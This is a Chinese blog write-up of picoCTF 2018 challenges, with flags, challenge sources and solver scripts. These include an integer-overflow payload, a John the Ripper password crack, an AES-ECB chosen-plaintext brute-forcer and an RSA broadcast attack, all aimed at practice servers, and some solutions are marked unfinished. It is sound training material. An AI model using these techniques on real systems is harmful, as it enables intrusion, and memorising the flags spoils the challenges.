---
toc: true
comments: true
title: picoCTF-2018 解题报告
tags: [ctf]
category: writeup
date: 2018-10-11 22:07:27
---




![1539266772853](1539266772853.png)

题目：https://findneo.github.io/p/picoCTF-2018-Problems.html 

附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf 

# Forensics

## Forensics Warmup 1

`picoCTF{welcome_to_forensics}` 

## Forensics Warmup 2 

`picoCTF{extensions_are_a_lie}` 

## Desrouleaux

```bash
nc 2018shell2.picoctf.com 63299
You'll need to consult the file `incidents.json` to answer the following questions.

What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones.
250.226.237.236
Correct!

How many unique destination IP addresses were targeted by the source IP address 193.1.59.100?
2
Correct!

What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places.
1.43
Correct!

Great job. You've earned the flag: picoCTF{J4y_s0n_d3rUUUULo_23fa6fa6}

/*精确到小数点后两位 (1+1+2+1+3+1+1)/7=1.43

import json
j=json.load(open('incidents.json'))
tickets=j['tickets']
hashes=dict()
for t in tickets:
	if t['file_hash'] not in hashes.keys():
		hashes[t['file_hash']]=[t['dst_ip']]
	else:
		hashes[t['file_hash']].append(t['dst_ip'])
print hashes
# {
# u'78d8572c143fb161': [u'90.174.224.210'], 
# u'a275ec611d018a67': [u'94.165.167.88'], 
# u'308f80097c708e3d': [u'90.174.224.210', u'216.243.24.241'], 
# u'27d9b03884d73aaa': [u'94.165.167.88'], 
# u'23420f902d5382e1': [u'94.165.167.88', u'16.139.98.188', u'46.11.226.205'], 
# u'ea45791ce3528103': [u'127.19.170.162'], 
# u'729b56eab8ac3252': [u'94.165.167.88']}
*/
```

## Reading Between the Eyes

![1538361495312](1538361495312.png)

`picoCTF{r34d1ng_b37w33n_7h3_by73s}` 

## Recovering From the Snap

```bash
root@kali:~/桌面/picoctf# file animals.dd
animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "mkfs.fat", sectors/cluster 4, root entries 512, sectors 20480 (volumes <=32 MB), Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT (16 bit)
root@kali:~/桌面/picoctf# fdisk -lu animals.dd
Disk animals.dd: 10 MiB, 10485760 bytes, 20480 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000
```

参考 [这里](https://www.bleepingcomputer.com/forums/t/522890/imagedd-file-of-a-corrupted-external-hd-looking-to-mountrecover/) ，使用[OSFMount](https://www.osforensics.com/tools/mount-disk-images.html) 挂载磁盘，使用 [TestDisk & PhotoRec 7.1-WIP, Data Recovery](https://www.cgsecurity.org/wiki/TestDisk_Download) 恢复被删除的`theflag.jpg` 。

`picoCTF{th3_5n4p_happ3n3d}` 

![1538323453203](1538323453203.png)

## admin panel

用wireshark打开，导出HTTP对象，其中一个文件内容是`user=admin&password=picoCTF{n0ts3cur3_df598569}` 。

## hex editor

```bash
strings hex_editor.jpg | grep pico
Your flag is: "picoCTF{and_thats_how_u_edit_hex_kittos_8BcA67a2}"
```

## Truly an Artist

```bash
strings 2018.png | grep pico
picoCTF{look_in_image_9f5be995}
```

## now you don't

![1538239287549](1538239287549.png)

`picoCTF{n0w_y0u_533_m3}`

## 【X】Ext Super Magic

hexdump -n8 ext-super-magic.img

printf '\x53\xEF' | dd conv=notrunc bs=1 count=2 of=ext-super-magic.img

printf '\x53\xEF' | cat - ext-super-magic.img > ext.img

printf '\xEF\x53' | cat - ext-super-magic.img > ext.img

debugfs

```bash
root@kali:~/桌面/picoctf# e2fsck ext-super-magic.img 
e2fsck 1.44.4 (18-Aug-2018)
ext2fs_open2: Bad magic number in super-block
e2fsck: Superblock invalid, trying backup blocks...
e2fsck: Bad magic number in super-block while trying to open ext-super-magic.img

The superblock could not be read or does not describe a valid ext2/ext3/ext4
filesystem.  If the device is valid and it really contains an ext2/ext3/ext4
filesystem (and not swap or ufs or something else), then the superblock
is corrupt, and you might try running e2fsck with an alternate superblock:
    e2fsck -b 8193 <device>
 or
    e2fsck -b 32768 <device>

root@kali:~/桌面/picoctf# e2fsck -b 8193 ext-super-magic.img 
e2fsck 1.44.4 (18-Aug-2018)
e2fsck: Attempt to read block from filesystem resulted in short read while trying to open ext-super-magic.img
Could this be a zero-length partition?
root@kali:~/桌面/picoctf# e2fsck -b 32768 ext-super-magic.img 
e2fsck 1.44.4 (18-Aug-2018)
e2fsck: Attempt to read block from filesystem resulted in short read while trying to open ext-super-magic.img
Could this be a zero-length partition?

```



## Lying Out

根据日常流量图判断流量可能异常的时间点。

![1538371756947](1538371756947.png)

```python
from pwn import *
log=[
    10900,10800,10850,11000,10800,10750,10800,10850,
    10900,11000,10800,10800,11000,10900,10700,10850,
    10800,10850,11000,11050,10650,10800,10700,11000,
    10900,10950,10950,10800,11000,11100,11900,13400,
    13800,13400,12000,11000,10800,10800,10700,10800,
    10800,11000,10900,11050,11800,13100,14600,16100,
    16600,16400,14400,12800,11800,11000,10950,10800,
    10800,10800,10800,10800,10900,10850,10850,10800,
    10800,11000,11000,11000,11400,11900,13000,14000,
    14800,15800,16200,15800,14700,13700,12200,12100,
    11100,11000,10900,10800,10700,11000,11000,10800,
    10900,10700,10900,10800,10750,10950,10900,10800
]

r=remote('2018shell2.picoctf.com',39410)
prompt=r.recvuntil('num_IPs')
data=r.recv()
nums=data.split()
print prompt,'\n',nums
group=len(nums)/4
res=[]
for i in range(group):
	t=nums[i*4+2].split(':')
	tt=int(t[0])*4+int(t[1])/15
	if int(nums[i*4+3])>log[tt]:
		res.append(nums[i*4])

r.sendline(' '.join(res))
print ' '.join(res),r.recv()
r.close()

# [x] Opening connection to 2018shell2.picoctf.com on port 39410
# [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204
# [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done
# You'll need to consult the file `traffic.png` to answer the following questions.


# Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.
#     log_ID      time  num_IPs 
# ['0', '0', '01:00:00', '11637', '1', '1', '01:30:00', '11640', '2', '2', '02:45:00', '11616', '3', '3', '10:45:00', '9962', '4', '4', '10:45:00', '10409', '5', '5', '11:45:00', '12732', '6', '6', '14:15:00', '10538', '7', '7', '16:15:00', '10233', '8', '8', '17:30:00', '10839', '9', '9', '20:15:00', '11936', '10', '10', '20:30:00', '9898', '11', '11', '21:45:00', '9653', '12', '12', '22:30:00', '10252', '13', '13', '23:15:00', '9619']
# 0 1 2 9 Correct!


# Great job. You've earned the flag: picoCTF{w4y_0ut_940df760}

# [*] Closed connection to 2018shell2.picoctf.com port 39410
# [Finished in 3.6s]
```

## What's My Name? 

`picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}`  

![1538368152075](1538368152075.png)

## Malware Shops

附件貌似有问题，爆破出第一个答案是5，第二个随手交一下flag就出来了。

```bash
$ nc 2018shell2.picoctf.com 57920
You'll need to consult the file `clusters.png` to answer the following questions.


How many attackers created the malware in this dataset?
5
Correct!


In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file's hash.
       hash  jmp_count  add_count
0  87847bfc       32.0       29.0
1  7eeed4b3       34.0       34.0
2  ad5e4ce0       21.0       64.0
3  628e79cf       14.0       26.0
4  b5e53809       11.0       35.0
5  ebaf5ccd       15.0       13.0
6  94ad3582       37.0       10.0
7  42f1d364       23.0       68.0
8  93827b93       11.0       38.0
9  c08300fe       41.0       10.0
7eeed4b3
Correct!


Great job. You've earned the flag: picoCTF{w4y_0ut_0915ebc6}
```

## 【X】LoadSomeBits

#  General Skills

## absolutely relative

```c
#include <stdio.h>
#include <string.h>

#define yes_len 3
const char *yes = "yes";

int main()
{
    char flag[99];
    char permission[10];
    int i;
    FILE * file;


    file = fopen("/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt" , "r");
    if (file) {
    	while (fscanf(file, "%s", flag)!=EOF)
    	fclose(file);
    }   
	
    file = fopen( "./permission.txt" , "r");
    if (file) {
    	for (i = 0; i < 5; i++){
            fscanf(file, "%s", permission);
        }
        permission[5] = '\0';
        fclose(file);
    }
    
    if (!strncmp(permission, yes, yes_len)) {
        printf("You have the write permissions.\n%s\n", flag);
    } else {
        printf("You do not have sufficient permissions to view the flag.\n");
    }
    
    return 0;
}
```

![1539439034675](1539439034675.png)

## Aca-Shell-A 

![1539139814957](1539139814957.png)

![1539139848050](1539139848050.png)

```bash
picoCTF{CrUsHeD_It_17ab99f5}
```

## in out error

```bash
echo "Please may I have the flag?" | ./in-out-error  > ~/result.txt
#picoCTF{p1p1ng_1S_4_7h1ng_f37fb67e}
```

## learn gdb

`picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}` 

![1538828295272](1538828295272.png)

## store

```c
root@kali:~# curl https://2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        printf("Welcome to the Store App V1.0\n");
        printf("World's Most Secure Purchasing App\n");

        printf("\n[1] Check Account Balance\n");
        printf("\n[2] Buy Stuff\n");
        printf("\n[3] Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Current Auctions\n");
            printf("[1] I Can't Believe its not a Flag!\n");
            printf("[2] Real Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("Imitation Flags cost 1000 each, how many would you like?\n");
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 1000*number_flags;
                    printf("\nYour total cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour new balance: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds\n");
                    }   
                }
            }
            else if(auction_choice == 2){
                printf("A genuine Flag costs 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to purchase");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){                
                    if(account_balance > 100000){
                        printf("YOUR FLAG IS:\n");
                        }                 
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}
            }
        }
        else{
            con = 1;
        }
    }
    return 0;
}
```

整数溢出。

```bash
python -c 'print "2\n1\n"+str(((1100-100001)+2**32)/1000)+"\n2\n2\n1\n3\n"' | nc 2018shell2.picoctf.com 43581 | grep pico
# Enter 1 to purchaseYOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c}
```

## 【X】roulette

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <limits.h>

#define MAX_NUM_LEN 12
#define HOTSTREAK 3
#define MAX_WINS 16
#define ONE_BILLION 1000000000
#define ROULETTE_SIZE 36
#define ROULETTE_SPINS 128
#define ROULETTE_SLOWS 16
#define NUM_WIN_MSGS 10
#define NUM_LOSE_MSGS 5

long cash = 0;
long wins = 0;

int is_digit(char c) {
    return '0' <= c && c <= '9';
}

long get_long() {
    printf("> ");
    uint64_t l = 0;
    char c = 0;
    while(!is_digit(c))
      c = getchar();
    while(is_digit(c)) {
      if(l >= LONG_MAX) {
	l = LONG_MAX;
	break;
      }
      l *= 10;
      l += c - '0';
      c = getchar();
    }
    while(c != '\n')
      c = getchar();
    return l;
}

long get_rand() {
  long seed;
  FILE *f = fopen("/dev/urandom", "r");
  fread(&seed, sizeof(seed), 1, f);
  fclose(f);
  seed = seed % 5000;
  if (seed < 0) seed = seed * -1;
  srand(seed);
  return seed;
}

long get_bet() {
  while(1) {
    puts("How much will you wager?");
    printf("Current Balance: $%lu \t Current Wins: %lu\n", cash, wins); 
    long bet = get_long(); 
    if(bet <= cash) {
      return bet;
    } else {
      puts("You can't bet more than you have!");
    }
  }
}

long get_choice() {
  while (1) {
    printf("Choose a number (1-%d)\n", ROULETTE_SIZE);
    long choice = get_long();
    if (1 <= choice && choice <= ROULETTE_SIZE) {
      return choice;
    } else {
      puts("Please enter a valid choice.");
    }
  }
}

int print_flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Failed to open the flag file\n");
    return -1;
  }
  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

const char *win_msgs[NUM_WIN_MSGS] = {
  "Wow.. Nice One!",
  "You chose correct!",
  "Winner!",
  "Wow, you won!",
  "Alright, now you're cooking!",
  "Darn.. Here you go",
  "Darn, you got it right.",
  "You.. win.. this round...",
  "Congrats!",
  "You're not cheating are you?",
};

const char *lose_msgs1[NUM_LOSE_MSGS] = {
  "WRONG",
  "Nice try..",
  "YOU LOSE",
  "Not this time..",
  "Better luck next time..."
};

const char *lose_msgs2[NUM_LOSE_MSGS] = {
  "Just give up!",
  "It's over for you.",
  "Stop wasting your time.",
  "You're never gonna win",
  "If you keep it up, maybe you'll get the flag in 100000000000 years"
};

void spin_roulette(long spin) {
  int n;
  puts("");
  printf("Roulette  :  ");
  int i, j;
  int s = 12500;
  for (i = 0; i < ROULETTE_SPINS; i++) {
    n = printf("%d", (i%ROULETTE_SIZE)+1);
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  for (i = ROULETTE_SPINS; i < (ROULETTE_SPINS+ROULETTE_SIZE); i++) {
    n = printf("%d", (i%ROULETTE_SIZE)+1);
    if (((i%ROULETTE_SIZE)+1) == spin) {
      for (j = 0; j < n; j++) {
	printf("\b \b");
      }
      break;
    }
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  for (int k = 0; k < ROULETTE_SIZE; k++) {
    n = printf("%d", ((i+k)%ROULETTE_SIZE)+1);
    s = 1.1*s;
    usleep(s);
    for (j = 0; j < n; j++) {
      printf("\b \b");
    }
  }
  printf("%ld", spin);
  usleep(s);
  puts("");
  puts("");
}

void play_roulette(long choice, long bet) {
  
  printf("Spinning the Roulette for a chance to win $%lu!\n", 2*bet);
  long spin = (rand() % ROULETTE_SIZE)+1;

  spin_roulette(spin);
  
  if (spin == choice) {
    cash += 2*bet;
    puts(win_msgs[rand()%NUM_WIN_MSGS]);
    wins += 1;
  }
  else {
    puts(lose_msgs1[rand()%NUM_LOSE_MSGS]);
    puts(lose_msgs2[rand()%NUM_LOSE_MSGS]);
  }
  puts("");
}

int main(int argc, char *argv[]) {
  setvbuf(stdout, NULL, _IONBF, 0);

  cash = get_rand();
  
  puts("Welcome to ONLINE ROULETTE!");
  printf("Here, have $%ld to start on the house! You'll lose it all anyways >:)\n", cash);
  puts("");
  
  long bet;
  long choice;
  while(cash > 0) {
      bet = get_bet();
      cash -= bet;
      choice = get_choice();
      puts("");
      
      play_roulette(choice, bet);
      
      if (wins >= MAX_WINS) {
	printf("Wow you won %lu times? Looks like its time for you cash you out.\n", wins);
	printf("Congrats you made $%lu. See you next time!\n", cash);
	exit(-1);
      }
      
      if(cash > ONE_BILLION) {
	printf("*** Current Balance: $%lu ***\n", cash);
	if (wins >= HOTSTREAK) {
	  puts("Wow, I can't believe you did it.. You deserve this flag!");
	  print_flag();
	  exit(0);
	}
	else {
	  puts("Wait a second... You're not even on a hotstreak! Get out of here cheater!");
	  exit(-1);
	}
	}
  }
  puts("Haha, lost all the money I gave you already? See ya later!");
  return 0;
}
```

## 【X】scriptme

```bash
root@kali:~/bintest# nc 2018shell2.picoctf.com 61344
Rules:
() + () = ()()                                      => [combine]
((())) + () = ((())())                              => [absorb-right]
() + ((())) = (()(()))                              => [absorb-left]
(())(()) + () = (())(()())                          => [combined-absorb-right]
() + (())(()) = (()())(())                          => [combined-absorb-left]
(())(()) + ((())) = ((())(())(()))                  => [absorb-combined-right]
((())) + (())(()) = ((())(())(()))                  => [absorb-combined-left]
() + (()) + ((())) = (()()) + ((())) = ((()())(())) => [left-associative]

Example: 
(()) + () = () + (()) = (()())

Let's start with a warmup.
(()()()) + (()) = ???
```

## assembly-0

What does asm0(0xd8,0x7a) return? 0x7a。

 ```assembly
.intel_syntax noprefix
.bits 32
	
.global asm0

asm0:
	push	ebp
	mov	ebp,esp
	mov	eax,DWORD PTR [ebp+0x8]
	mov	ebx,DWORD PTR [ebp+0xc]
	mov	eax,ebx
	mov	esp,ebp
	pop	ebp	
	ret
 ```

## assembly-1 

What does asm1(0xcd) return? 0xca。

```assembly
.intel_syntax noprefix
.bits 32
	
.global asm1

asm1:
	push	ebp
	mov	ebp,esp
	cmp	DWORD PTR [ebp+0x8],0xde
	jg 	part_a	
	cmp	DWORD PTR [ebp+0x8],0x8
	jne	part_b
	mov	eax,DWORD PTR [ebp+0x8]
	add	eax,0x3
	jmp	part_d
part_a:
	cmp	DWORD PTR [ebp+0x8],0x4e
	jne	part_c
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
part_b:
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
	cmp	DWORD PTR [ebp+0x8],0xee
	jne	part_c
	mov	eax,DWORD PTR [ebp+0x8]
	sub	eax,0x3
	jmp	part_d
part_c:
	mov	eax,DWORD PTR [ebp+0x8]
	add	eax,0x3
part_d:
	pop	ebp
	ret
```

## assembly-2

What does asm2(0x7,0x28) return?   `hex(int((0xa1df-0x7)/float(0x76))+1+0x28)` => 0x188

```assembly
.intel_syntax noprefix
.bits 32
	
.global asm2

asm2:
	push   	ebp
	mov    	ebp,esp
	sub    	esp,0x10
	mov    	eax,DWORD PTR [ebp+0xc]
	mov 	DWORD PTR [ebp-0x4],eax
	mov    	eax,DWORD PTR [ebp+0x8]
	mov	DWORD PTR [ebp-0x8],eax
	jmp    	part_b
part_a:	
	add    	DWORD PTR [ebp-0x4],0x1
	add	DWORD PTR [ebp+0x8],0x76
part_b:	
	cmp    	DWORD PTR [ebp+0x8],0xa1de
	jle    	part_a
	mov    	eax,DWORD PTR [ebp-0x4]
	mov	esp,ebp
	pop	ebp
	ret
```

## 【X】assembly-3

What does asm3(0xbda42100,0xb98dd6a5,0xecded223) return?  

```assembly
.bits 32
	
.global asm3
;hex
;eax xx xx xx xx
;ax        xx xx
;ah        xx
;al           xx

;now xx xx xx xx
;ebp+0x10 ecded223
;ebp+0xc  b98dd6a5
;ebp+0x8  bda42100

;ebp+0xc ecded223
;ebp+0x8  b98dd6a5
;ebp+0x4  bda42100

asm3:
	push   	ebp
	mov    	ebp,esp
	mov	eax,0xbc
;now 00 00 00 bc
	xor	al,al
;now 00 00 00 00
	mov	ah,BYTE PTR [ebp+0x9] ;a4
;now 00 00 a4 00
	sal	ax,0x10
;now 00 00 00 00
	sub	al,BYTE PTR [ebp+0xc] ;b9
;now 00 00 00 47 ;100h-b9h ?
	add	ah,BYTE PTR [ebp+0xd] ;8d
;now 00 00 8d 47
	xor	ax,WORD PTR [ebp+0x10] ;ecde
;now 00 00 61 19
;eax=0x00006119 ???
	mov	esp, ebp
	pop	ebp
	ret
```

- https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/reversing/#assembly-3 
- https://ctftime.org/writeup/11693 
- https://github.com/xnand/ctf_writeups/blob/master/picoCTF2018/assembly-0-1-2-3-4/README.md 

# binary exploitation

## buffer overflow 0

`picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}` 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}
```

# Cryptography

## Crypto Warmup 1

```python
>>> print "picoCTF{%s}"%''.join(map(lambda x:chr((ord(x[0])-ord(x[1]))%26+ord('a')),zip('llkjmlmpadkkc','thisisalilkey'))).upper()
picoCTF{SECRETMESSAGE}
```

## caesar cipher 2

```python
''.join(map(lambda x:chr((ord(x)+32)%0xff),'PICO#4&[C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%]'))
# 'picoCTF{cAesaR_CiPhErS_juST_aREnT_sEcUrE}'
```

## blaise's cipher

在线解密即可：https://www.dcode.fr/vigenere-cipher 。逐步得到KEY长度为4，KEY为`FLAG`

`picoCTF{v1gn3r3_c1ph3rs_ar3n7_bad_901e13a1}` 

## Safe RSA

```python
import gmpy2,binascii
e=3
c=2205316413931134031046440767620541984801091216351222789180593875373829950860542792110364325728088504479780803714561464250589795961097670884274813261496112882580892020487261058118157619586156815531561455215290361274334977137261636930849125
m=gmpy2.iroot(c,e)[0]
print binascii.unhexlify(hex(m).strip('lL')[2:])
# picoCTF{e_w4y_t00_sm411_9f5d2464}
```

## 【X】Super Safe RSA

参考[RSA的广播攻击](https://findneo.github.io/180727rsa-attack/#广播攻击) 。

```PYTHON
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# __author__ = findneo

import gmpy2,re
from pwn import connect
from time import sleep
c=[]
n=[]

with open('buf','r') as f:
    for i in f.readlines():
        j=i.strip().split(' ')
        c.append(int(j[0]))
        n.append(int(j[1]))
print "mytag:",len(c)
with open('buf','a') as f:
    while len(c)<65538:
        r=connect('2018shell2.picoctf.com',24039)
        res=r.recv()
        g=re.findall('c: (\d+)\nn: (\d+)\n.*',res)[0]
        f.write(' '.join(g)+'\n')
        c.append(g[0])
        n.append(g[1])
        r.close()
        # sleep(0.1)
        if len(c)%1000==0:
            print 'mytag:',len(c)
def GCRT(mi, ai):
    # mi,ai分别表示模数和取模后的值,都为列表结构
    assert (isinstance(mi, list) and isinstance(ai, list))
    curm, cura = mi[0], ai[0]
    for (m, a) in zip(mi[1:], ai[1:]):
        d = gmpy2.gcd(curm, m)
        c = a - cura
        assert (c % d == 0) #不成立则不存在解
        K = c / d * gmpy2.invert(curm / d, m / d)
        cura += curm * K
        curm = curm * m / d
        cura %= curm
    return (cura % curm, curm) #(解,最小公倍数)

print GCRT(n,c)[0]
```

## HEEEEEEERE'S Johnny!

```bash
cp /usr/share/wordlists/rockyou.txt.gz .
gunzip rockyou.txt.gz
unshadow passwd shadow > unshadowes.txt
john --wordlist=~/mywordlists/rockyou.txt --rules unshadowes.txt
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
thematrix        (root)
1g 0:00:00:16 DONE (2018-10-10 10:04) 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra
Use the "--show" option to display all of the cracked passwords reliably
Session completed

nc 2018shell2.picoctf.com 38860
Username: root
Password: thematrix
picoCTF{J0hn_1$_R1pp3d_4e5aa29e}
```



## rsa-madlibs

回答一些简单的RSA知识。可以参考[CTF中常见的RSA相关问题总结](https://findneo.github.io/180727rsa-attack/) 一文。

发现一个做这类题目的好方法，`python solve.py | nc 2018shell2.picoctf.com 18148` ，不到必要就不去处理各种奇怪的数据。

`picoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}` 

## SpyFi

```python
#!/usr/bin/python2 -u
from Crypto.Cipher import AES

agent_code = """flag"""

def pad(message):
    if len(message) % 16 != 0:
        message = message + '0'*(16 - len(message)%16 )
    return message

def encrypt(key, plain):
    cipher = AES.new( key.decode('hex'), AES.MODE_ECB )
    return cipher.encrypt(plain).encode('hex')

welcome = "Welcome, Agent 006!"
print welcome

sitrep = raw_input("Please enter your situation report: ")
message = """Agent,
Greetings. My situation report is as follows:
{0}
My agent identifying code is: {1}.
Down with the Soviets,
006
""".format( sitrep, agent_code )

message = pad(message)
print encrypt( """key""", message )
```

AES的ECB模式存在选择明文攻击。

当输入9个字节时，message中flag之外的部分长度为122个字节，密文长度为160个字节；当输入10个字节时，密文长度为176个字节。说明flag长度为160-122=38个字节。

![1538925911862](1538925911862.png)

将message分组输出，看到爆破flag的机会。

![1538929635797](1538929635797.png)

写完代码验证可行。

![1538934008777](1538934008777.png)

最后成果：

`picoCTF{@g3nt6_1$_th3_c00l3$t_8124762}` 

![1538938179361](1538938179361.png)

![1538938605546](1538938605546.png)

全部代码：

```python
def part_msg(message,part_length=16):
	sl=len(message)
	pl=part_length 
	m=[message[pl*i:min(sl,pl*i+pl)] for i in range(sl/pl+(sl%pl>0))]
	return m
msg=['Agent,\nGreetings. My situation report is as follows:\n','\nMy agent identifying code is: ','.\nDown with the Soviets,\n006\n',]

from pwn import connect
import string
import time
def solve():
	cnt=0
	flag='picoCTF{@'
	# sitrep,agent_code='',''
	# message =msg[0] +sitrep+msg[1]+agent_code+msg[2]
	for j in range(38-len(flag)):
		for i in string.printable:
			# print "flag:",i
			r=connect("2018shell2.picoctf.com",37131)
			cnt+=1;time.sleep(1)
			prompt=r.recvuntil("report: ")
			# 113 + (11+16+38+10)  + 38 = 226
			base='fying code is: '+flag
			sitrep='@'*11+base[-15:]+i+'@'*(38-len(flag)+10)
			# agent_code="#"*38
			# message =msg[0] +sitrep+msg[1]+agent_code+msg[2]
			# print '\n'.join(map(repr,part_msg(message)))
			r.sendline(sitrep)
			response=r.recv()
			# print len(response)
			tmp=part_msg(response,32)
			# print len(tmp)
			# print '\n'.join(tmp)
			r.close()
			# print len(msg[0]+sitrep+msg[1]+flag)/16
			if tmp[4]==tmp[len(msg[0]+sitrep+msg[1]+flag)/16]:
				flag+=i
				break
		print "flag:",flag,cnt

print "flag:",time.asctime()
solve()
print "flag:",time.asctime()
```

#  Web Exploitation

## Buttons

```bash
curl http://2018shell2.picoctf.com:65107/button2.php --data "123"
Well done, your flag is: picoCTF{button_button_whose_got_the_button_91f6f39a}
```

## Artisinal Handcrafted HTTP 3

先请求一下login页面：

```http
GET /login HTTP/1.1
Host: flag.local


```

发现表单是这样的：

```php
HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 498
etag: W/"1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I"
date: Sun, 07 Oct 2018 18:33:21 GMT
connection: close


		<html>
			<head>
				<link rel="stylesheet" type="text/css" href="main.css" />
			</head>
			<body>
				<header>
					<h1>Real Business Internal Flag Server</h1>
					<a href="/login">Login</a>
				</header>
				<main>
					<h2>Log In</h2>
					
					<form method="POST" action="login">
						<input type="text" name="user" placeholder="Username" />
						<input type="password" name="pass" placeholder="Password" />
						<input type="submit" />
					</form>
				</main>
			</body>
		</html>

```

再请求登陆：

```http
POST /login HTTP/1.1
Host: flag.local
Content-Length: 38
Content-Type: application/x-www-form-urlencoded

user=realbusinessuser&pass=potoooooooo
```

响应：

```http
HTTP/1.1 302 Found
x-powered-by: Express
set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
location: /
vary: Accept
content-type: text/plain; charset=utf-8
content-length: 23
date: Tue, 09 Oct 2018 15:11:46 GMT
connection: close

Found. Redirecting to /
```

带上cookie请求：

```http
GET / HTTP/1.1
Host: flag.local
cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
```

响应：

```http
HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 438
etag: W/"1b6-eYJ8DUTdkgByyfWFi6OJJSjopFg"
date: Tue, 09 Oct 2018 15:12:57 GMT
connection: close


<html>
    <head>
        <link rel="stylesheet" type="text/css" href="main.css" />
    </head>
    <body>
        <header>
            <h1>Real Business Internal Flag Server</h1>
            <div class="user">Real Business Employee</div>
            <a href="/logout">Logout</a>
        </header>
        <main>
            <p>Hello <b>Real Business Employee</b>!  Today's flag is: <code>picoCTF{0nLY_Us3_n0N_GmO_xF3r_pR0tOcol5_2e14}</code>.</p>
        </main>
    </body>
</html>
```

## 【X】Secure Logon

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash
import json
from hashlib import md5
from base64 import b64decode
from base64 import b64encode
from Crypto import Random
from Crypto.Cipher import AES

app = Flask(__name__)
app.secret_key = 'seed removed'
flag_value = 'flag removed'

BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]


@app.route("/")
def main():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.form['user'] == 'admin':
        message = "I'm sorry the admin password is super secure. You're not getting in that way."
        category = 'danger'
        flash(message, category)
        return render_template('index.html')
    resp = make_response(redirect("/flag"))

    cookie = {}
    cookie['password'] = request.form['password']
